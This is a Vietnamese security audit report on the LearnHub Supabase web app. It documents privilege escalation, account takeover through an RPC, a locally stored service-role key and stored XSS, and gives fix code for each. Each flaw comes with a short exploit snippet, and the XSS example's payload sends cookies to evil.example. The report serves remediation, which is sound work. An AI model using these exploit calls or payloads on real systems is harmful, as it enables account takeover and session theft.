# BÁO CÁO BẢO MẬT — LearnHub

> Ngày rà soát: 02/08/2026
> Mục đích: tài liệu giao cho đội fix. Mỗi lỗi gồm: mô tả → nguyên nhân gốc (kèm vị trí + code hiện tại) → cách khai thác → ảnh hưởng → mức độ → hướng dẫn fix (code cụ thể) → cách kiểm chứng fix.

---

## MỤC LỤC

1. [C1 — CRITICAL: Leo quyền thành admin qua policy update](#c1)
2. [C2 — CRITICAL: Chiếm tài khoản qua RPC `claim_legacy_data`](#c2)
3. [C3 — HIGH: Secret key tồn tại trong dự án](#c3)
4. [C4 — HIGH: Stored XSS qua `name` / `photo` / `bio`](#c4)
5. [Phụ lục: các lỗi trung bình nên xử lý sau](#phuluc)

---

<a name="c1"></a>
## C1 — CRITICAL: Leo quyền thành admin qua policy update

### Mô tả
Bất kỳ user đã đăng nhập nào cũng có thể tự đổi `role` của mình thành `admin`, nhờ policy RLS cho phép update bản ghi của chính mình mà **không giới hạn cột**.

### Nguyên nhân gốc
File: `supabase/schema.sql` (dòng 410-412)

```sql
drop policy if exists users_update_own on public.users;
create policy users_update_own on public.users
  for update to authenticated using (id = auth.uid()::text) with check (id = auth.uid()::text);
```

Postgres RLS **không thể** giới hạn cột trong policy. `USING/CHECK` chỉ kiểm tra được dòng. Nên user được phép update mọi cột của dòng mình, gồm cả `role`.

Hậu quả được "đóng gói" bởi hàm kiểm tra admin (`schema.sql:168-178`):

```sql
create or replace function public.is_admin()
returns boolean language sql stable security definer
set search_path = public
as $$
  select exists (
    select 1 from public.users
    where id = auth.uid()::text
      and (lower(role) = 'admin' or email = 'learnhubadmin@gmail.com')
  );
$$;
```

→ set `role = 'admin'` là xong quyền admin.

### Cách khai thác
```js
// Bất kỳ client đã đăng nhập:
supabase.from("users").update({ role: "admin" }).eq("id", currentUserId);
```
Sau đó `is_admin()` trả `true` → tất cả policy `..._write_admin` (`schema.sql:414-424`) và `access_list_write_admin` kích hoạt: xoá/sửa bài forum, đọc+ghi `access_list`, thay đổi dữ liệu mọi bảng.

### Ảnh hưởng
- Chiếm toàn bộ quyền admin trên database.
- Sửa/xoá bài viết, dữ liệu test, danh sách truy cập.
- Phá hoại hệ thống, giả mạo admin trong UI.

### Mức độ
**CRITICAL** (CVSS ≈ 9.8) — khai thác tầm thường, không cần đặc quyền trước, tác động toàn hệ thống.

### Hướng dẫn fix (khuyên dùng: trigger chặn — không cần đổi code client)

Thêm vào cuối `supabase/schema.sql` (chạy lại một lần):

```sql
-- ============ FIX C1: chặn user tự đổi role/email/id ============
create or replace function public.users_prevent_privilege_update()
returns trigger
language plpgsql security definer
set search_path = public
as $$
begin
  if (new.id is distinct from old.id) then
    raise exception 'Không được tự đổi id.';
  end if;
  if (new.email is distinct from old.email) then
    raise exception 'Không được tự đổi email.';
  end if;
  if (new.role is distinct from old.role) then
    -- Admin thật (qua is_admin) mới được đổi role
    if not public.is_admin() then
      raise exception 'Không được tự đổi quyền (role).';
    end if;
  end if;
  return new;
end;
$$;

drop trigger if exists trg_users_prevent_privilege_update on public.users;
create trigger trg_users_prevent_privilege_update
  before update on public.users
  for each row execute function public.users_prevent_privilege_update();
```

> Ghi chú kỹ thuật cho người fix:
> - Trigger `security definer` chạy với quyền owner nên không bị RLS cản, `public.is_admin()` bên trong vẫn dùng `auth.uid()` nên chuẩn.
> - Cách này KHÔNG phải đổi code client (`profile.html` vẫn `supabase.from("users").update(...)` bình thường).
> - Phương án thay thế (an toàn hơn nhưng đụng client): bỏ hẳn policy `users_update_own`, thay bằng RPC `security definer` `update_my_profile(...)` chỉ nhận các cột trắng `(name, photo, bio, phone, birthdate, gender, school, updated_at)`; client gọi `supabase.rpc("update_my_profile", {...})`.

### Cách kiểm chứng fix
```js
// Sau khi login bình thường:
supabase.from("users").update({ role: "admin" }).eq("id", currentUserId)
// -> phải trả lỗi: "Không được tự đổi quyền (role)."
// Đồng thời các cột thường (name, photo...) vẫn update được.
```

---

<a name="c2"></a>
## C2 — CRITICAL: Chiếm tài khoản qua RPC `claim_legacy_data`

### Mô tả
Hàm RPC `claim_legacy_data(p_email)` chạy với quyền `security definer` (quyền owner/DB), nhận **email do client truyền vào** mà không xác thực email đó có phải của người gọi hay không. Attacker truyền email nạn nhân → đọc, xoá profile nạn nhân, chiếm `test_stats`, `forum_posts`, xoá `legacy_uid_map`.

### Nguyên nhân gốc
File: `supabase/schema.sql` (dòng 244-314), toàn bộ tham số `p_email` lấy từ client:

```sql
create or replace function public.claim_legacy_data(p_email text)
returns text
language plpgsql security definer
set search_path = public
as $$
declare
  v_new_uid text := auth.uid()::text;
  v_old_uid text;
  v_legacy public.users%rowtype;
begin
  if v_new_uid is null or p_email is null or btrim(p_email) = '' then
    return null;
  end if;

  select firebase_uid into v_old_uid
    from public.legacy_uid_map
   where email = lower(btrim(p_email))
   limit 1;
  ...
  delete from public.users where id = v_old_uid;   -- xoá user nạn nhân
  ...
  update public.test_stats set user_id = v_new_uid where user_id = v_old_uid;
  update public.forum_posts set user_id = v_new_uid where user_id = v_old_uid;
  ...
end;
$$;

revoke execute on function public.claim_legacy_data(text) from public;
grant execute on function public.claim_legacy_data(text) to authenticated;
```

Client gọi (file `supabase-helpers.js` dòng 105):
```js
await supabase.rpc("claim_legacy_data", { p_email: email });
```
`email` là `user.email` từ session — hợp lệ cho người dùng thường, **nhưng không ai ngăn attacker đổi tham số thành email khác**.

### Cách khai thác
```js
// Attacker đã đăng nhập:
await supabase.rpc("claim_legacy_data", { p_email: "nạn-nhân@gmail.com" });
```
Hàm `security definer` bỏ qua RLS → xoá dòng `users` của nạn nhân, gán các bản ghi `test_stats`/`forum_posts` của nạn nhân sang uid attacker.

### Ảnh hưởng
- **Account takeover**: mất dữ liệu người khác, chiếm bài viết + điểm.
- Phá huỷ dữ liệu (delete + reinsert mất `id` cũ, gãy tham chiếu FK nếu có).
- Vi phạm GDPR/privacy nghiêm trọng.

### Mức độ
**CRITICAL** (CVSS ≈ 9.1) — một cuộc gọi RPC là chiếm tài khoản.

### Hướng dẫn fix (fix phía server, bỏ qua tham số client)

```sql
-- ============ FIX C2: chỉ cho claim đúng email của session hiện tại ============
create or replace function public.claim_legacy_data(p_email text)
returns text
language plpgsql security definer
set search_path = public
as $$
declare
  v_new_uid text := auth.uid()::text;
  v_session_email text;
  v_old_uid text;
  v_legacy public.users%rowtype;
begin
  if v_new_uid is null then
    return null;
  end if;

  -- Email QUYỀN LỰC lấy từ token JWT, KHÔNG tin tham số client.
  v_session_email := lower(btrim(coalesce(auth.jwt()->>'email', '')));
  if v_session_email = '' then
    return null;  -- không có email trong session thì từ chối
  end if;

  select firebase_uid into v_old_uid
    from public.legacy_uid_map
   where email = v_session_email
   limit 1;

  if v_old_uid is null then
    return null;
  end if;

  select * into v_legacy from public.users where id = v_old_uid;
  if v_legacy.id is null then
    return null;
  end if;

  -- An toàn kép: user legacy phải có email trùng với session
  if lower(btrim(coalesce(v_legacy.email, ''))) <> v_session_email then
    return null;
  end if;

  delete from public.users where id = v_old_uid;

  insert into public.users (
    id, email, name, photo, role, bio, phone, birthdate, gender, school,
    created_at, last_login, updated_at
  )
  values (
    v_new_uid,
    v_session_email,
    coalesce(nullif(btrim(coalesce(v_legacy.name, '')), ''), split_part(v_session_email, '@', 1)),
    v_legacy.photo,
    coalesce(nullif(v_legacy.role, ''), 'Thành viên'),
    v_legacy.bio, v_legacy.phone, v_legacy.birthdate, v_legacy.gender, v_legacy.school,
    coalesce(v_legacy.created_at, now()),
    coalesce(v_legacy.last_login, now()),
    now()
  )
  on conflict (id) do update set
    email       = excluded.email,
    name        = coalesce(nullif(btrim(coalesce(public.users.name, '')), ''), excluded.name),
    photo       = coalesce(public.users.photo, excluded.photo),
    role        = coalesce(nullif(excluded.role, ''), public.users.role),
    bio         = coalesce(public.users.bio, excluded.bio),
    phone       = coalesce(public.users.phone, excluded.phone),
    birthdate   = coalesce(public.users.birthdate, excluded.birthdate),
    gender      = coalesce(public.users.gender, excluded.gender),
    school      = coalesce(public.users.school, excluded.school),
    created_at  = coalesce(public.users.created_at, excluded.created_at),
    last_login  = coalesce(public.users.last_login, excluded.last_login),
    updated_at  = now();

  update public.test_stats set user_id = v_new_uid where user_id = v_old_uid;
  update public.forum_posts set user_id = v_new_uid where user_id = v_old_uid;

  delete from public.legacy_uid_map where firebase_uid = v_old_uid;

  return v_old_uid;
end;
$$;

revoke execute on function public.claim_legacy_data(text) from public;
grant execute on function public.claim_legacy_data(text) to authenticated;
```

> Ghi chú kỹ thuật cho người fix:
> - `auth.jwt()->>'email'` là email trong token do Supabase cấp, không giả mạo được bằng tham số.
> - Nếu hệ thống có luồng đăng nhập **chỉ bằng phone (không có email trong JWT)** thì tham số `p_email` sẽ bị bỏ qua → luồng legacy đó ngừng hoạt động; cần thêm mapping phone → email ở `legacy_uid_map` và đối chiếu qua `auth.jwt()->>'phone'` thay vì email.
> - Không cần đổi code client (`supabase-helpers.js` vẫn truyền `p_email`, server chỉ đơn giản bỏ qua nó).
> - Nên bổ sung bảng `legacy_uid_map` một trường `claimed_at`/`claimed_by` để ghi lại ai đã claim.

### Cách kiểm chứng fix
```js
// Tài khoản A (email khác với p_email):
await supabase.rpc("claim_legacy_data", { p_email: "victim@gmail.com" });
// -> trả null, KHÔNG xoá/thay đổi gì.

// Tài khoản B đúng email của chính nó (p_email = email session):
// -> vẫn claim được dữ liệu legacy của chính nó (luồng hợp lệ giữ nguyên).
```

---

<a name="c3"></a>
## C3 — HIGH: Secret key tồn tại trong dự án

### Mô tả
File `migrate/.env` chứa `SUPABASE_SECRET_KEY` (service-role key) — key có toàn quyền bỏ qua RLS.

### Kiểm chứng hiện trạng (đã làm tại thời điểm báo cáo)
- File tồn tại: `migrate/.env`:
  ```
  SUPABASE_URL=https://hyuzukvxulwouaexatqv.supabase.co
  SUPABASE_SECRET_KEY=sb_secret_...
  ```
- `.gitignore` **đã chặn** `migrate/.env`.
- `git ls-files` xác nhận file **KHÔNG được track** và **chưa từng nằm trong lịch sử commit** (`git log` không có dòng nào).
- Remote: `https://github.com/Kioshuke/learnhub.git`.

→ Kết luận: key **chưa bị rò rỉ ra GitHub**. Rủi ro hiện tại là **lộc cục bộ / bản sao ngoài repo** (máy dev, bản sao backup, chia sẻ qua chat…).

### Ảnh hưởng (nếu key bị lộ)
- Kẻ có key gọi thẳng `POST /rest/v1/...` với header `apikey` + `Authorization: Bearer <service_role_key>` → **bỏ qua toàn bộ RLS**, đọc/sửa/xoá mọi bảng, gọi mọi RPC `security definer`.
- Chiếm toàn quyền database Supabase. Không cần tài khoản người dùng.

### Mức độ
**HIGH** (CVSS ≈ 7.5) — chưa public nên chưa phải CRITICAL, nhưng bắt buộc xử lý.

### Hướng dẫn fix
1. **Rotate key ngay** (dù chưa lộ, để loại bỏ giá trị cũ đã nằm trong máy/backup):
   - Supabase Dashboard → **Project Settings → API keys → Service Role Key → Reset** (hoặc tạo mới + xoá cũ).
2. Cập nhật `migrate/.env` bằng key mới.
3. Giữ nguyên `.gitignore` (đã có dòng `migrate/.env`). Đảm bảo **không bao giờ** `git add -f migrate/.env` hoặc commit chung thư mục `migrate/`.
4. (Nếu deploy) chuyển secret sang biến môi trường của máy chủ / GitHub Secrets / Supabase Edge Function secrets — không để dưới dạng file trong repo.
5. (Khuyến nghị) Trong code production, tuyệt đối không nhúng service-role key vào file gửi xuống browser.

### Cách kiểm chứng fix
- `git ls-files | Select-String "\.env"` → không ra `migrate/.env`.
- Key cũ gọi tới Supabase → 401/403 (sau khi rotate).
- Key mới chỉ tồn tại ở máy chủ, không trong repo.

---

<a name="c4"></a>
## C4 — HIGH: Stored XSS qua `name` / `photo` / `bio`

### Mô tả
Dữ liệu do user nhập (`name`, `photo`, `bio`) được render bằng `innerHTML` **không escape** ở nhiều sink. Attacker đặt tên như `<img src=x onerror=alert(document.cookie)>` → code chạy trên trình duyệt **mọi người khác** xem danh sách online / trang profile. Lưu được vĩnh viễn qua `saveSettings`.

### Nguyên nhân gốc (các sink)

**Sink 1 — danh sách online** `index.html` (dòng 904-914):
```js
div.innerHTML = `
<div style="display:flex; align-items:center; gap:10px; padding:6px 8px;">
<img src="${u.photo || 'https://i.imgur.com/6VBx3io.png'}" ...>
<span style="...">${u.name || "User"}</span>
...
`;
```

**Sink 2 — grid user trên trang hồ sơ** `profile.html` (dòng 564-590):
```js
html += `
  <div ... onclick="viewUserProfile('${u.id}')">
    <img src="${u.photo || '...'}" ...>
    <span ...>${u.name || 'User'}</span>
  </div>
`;
```
→ ngoài XSS qua `name`/`photo` còn **XSS qua attribute** `onclick="viewUserProfile('${u.id}')"` nếu `u.id` chứa dấu nháy.

**Sink 3 — nơi dữ liệu xấu đi vào (chưa validate)** `profile.html` (dòng 975-1001):
```js
window.saveSettings = function(e) {
  ...
  const updatedProfile = {
    name: document.getElementById('input-name').value,   // không chặn ký tự
    photo: document.getElementById('input-avatar').value,// không kiểm tra scheme URL
    bio: document.getElementById('input-bio').value,
    ...
  };
  supabase.from("users").update(updatedProfile).eq("id", currentUserId)
  ...
}
```

**Sink 4 — content admin (welcome/broadcast)** gửi HTML không sanitize khi render (liên quan admin-dashboard, index/login). Cùng chung nguyên tắc fix bên dưới.

### Cách khai thác (demo)
```js
// Bước 1: attacker lưu tên chứa payload
await supabase.from("users").update({
  name: `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`
}).eq("id", attackerId);
// Bước 2: mọi user mở index.html / profile.html → payload chạy, cookie/token bị gửi ra ngoài.
```

### Ảnh hưởng
- Đánh cắp session/token của người xem (account takeover).
- Giả mạo hành động thay mặt nạn nhân.
- Xoá/sửa UI, phishing trong trang.

### Mức độ
**HIGH** (CVSS ≈ 8.0) — stored, kích hoạt không cần tương tác, ảnh hưởng mọi người truy cập.

### Hướng dẫn fix

**1) Tạo hàm escape dùng chung** — thêm vào một file util chung (vd `supabase-helpers.js` export, hoặc `<script>` ở đầu trang):

```js
function escapeHtml(v) {
  return String(v ?? "").replace(/[&<>"'`=\/]/g, (c) => ({
    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;","`":"&#96;","=":"&#61;","/":"&#47;"
  }[c]));
}
```

**2) Escape tất cả sink:**

- `index.html` dòng ~907-909:
  ```js
  const safeName = escapeHtml(u.name) || "User";
  const safePhoto = escapeUrl(u.photo) || "https://i.imgur.com/6VBx3io.png";
  div.innerHTML = `<img src="${safePhoto}" ...><span ...>${safeName}</span>...`;
  ```
- `profile.html` dòng ~569-577: dùng `escapeHtml(u.name)`, `escapeUrl(u.photo)`, và **thay attribute onclick** bằng `data-id` + addEventListener (tránh attribute injection):
  ```js
  html += `<div class="..." data-uid="${escapeHtml(u.id)}">...${escapeHtml(u.name)}...</div>`;
  // sau đó: container.addEventListener('click', e => { const id = e.target.closest('[data-uid]')?.dataset.uid; if (id) viewUserProfile(id); });
  ```

**3) Hàm kiểm tra URL ảnh an toàn** (chặn `javascript:`, `data:text/html`, sai scheme):
```js
function escapeUrl(u) {
  const s = String(u ?? "").trim();
  if (!s) return "";
  // chỉ cho http/https, KHÔNG cho data: hay javascript:
  try { const p = new URL(s); if (p.protocol === "http:" || p.protocol === "https:") return s; } catch (e) {}
  return "";
}
```

**4) Validate trước khi lưu** trong `saveSettings` (`profile.html` ~981): chặn lưu giá trị chứa `<`, `>`, hoặc URL không hợp lệ, giới hạn độ dài (`name` ≤ 60 ký tự, `bio` ≤ 200, v.v.). Tốt nhất thêm check cả phía DB (trigger/check constraint).

**5) Nội dung admin (welcome/broadcast)** — không render HTML trực tiếp: dùng DOMPurify (thư viện) `DOMPurify.sanitize(html)` trước khi đưa vào innerHTML, hoặc chuyển sang hiển thị thuần text.

**6) (Khuyến nghị) Chặn phía DB** — thêm trigger hoặc check constraint để từ chối `name`/`bio` chứa `<`/`>`, và cột `photo` chỉ nhận `http://`/`https://`.

### Cách kiểm chứng fix
```js
// Thử lưu: supabase.from("users").update({ name: "<img src=x onerror=alert(1)>" })
// -> client từ chối (không lưu) HOẶC lưu được nhưng render ra chữ thường "<img...>" không chạy.
// Mở index.html/profile.html xem danh sách: không có alert, không có request tới domain lạ.
```

---

<a name="phuluc"></a>
## Phụ lục — Các lỗi trung bình nên xử lý sau

1. **`is_admin()` phụ thuộc `role`** — vì C1/C2 cho phép sửa `role`/chiếm tài khoản, nên sau khi fix C1/C2 phần lớn được vá. Khuyến nghị về lâu dài: tách quyền admin ra bảng/flag riêng do DB kiểm soát, bỏ hẳn nhánh so sánh `email = 'learnhubadmin@gmail.com'` (email hardcode).
2. **Admin check client-side** — `admin-dashboard.html:1044-1050` chỉ so email; UI admin phải dựa trên server (RPC `security definer` kiểm tra `is_admin()`) cho mọi thao tác nhạy cảm.
3. **Session/token** — rà soát `localStorage` lưu session, cơ chế refresh, và các endpoint nội bộ có yêu cầu token đúng cách không.
4. **IDOR trên forum** — kiểm tra policy đọc/sửa/xoá bài viết không cho user thao tác bài của người khác.
5. **Upload ảnh** — xem lại bucket/RLS storage (đã có `{uid}/` prefix) và chặn file không phải ảnh.
6. **Rate-limit** — đăng nhập, quên mật khẩu, RPC nên có giới hạn tần suất (Supabase có built-in rate limiting / thêm captcha).
7. **Độ phơi bày file** — các file nhạy cảm ở web root: `supabase/schema.sql`, `migrate/*.sql`, `supabase-helpers.js`… nếu được serve tĩnh thì nên chặn truy cập công khai (schema tiết lộ cấu trúc DB).

---

## Tổng kết mức độ

| ID | Lỗ hổng | Mức | Vị trí chính | Ưu tiên fix |
|----|---------|-----|--------------|-------------|
| C1 | Leo quyền admin qua policy update | CRITICAL | `supabase/schema.sql:410-412` | 1 |
| C2 | Chiếm tài khoản qua `claim_legacy_data` | CRITICAL | `supabase/schema.sql:244-314` | 1 |
| C3 | Secret key trong dự án | HIGH | `migrate/.env` | 2 (rotate) |
| C4 | Stored XSS qua name/photo/bio | HIGH | `index.html:904-914`, `profile.html:564-590,975-1001` | 2 |
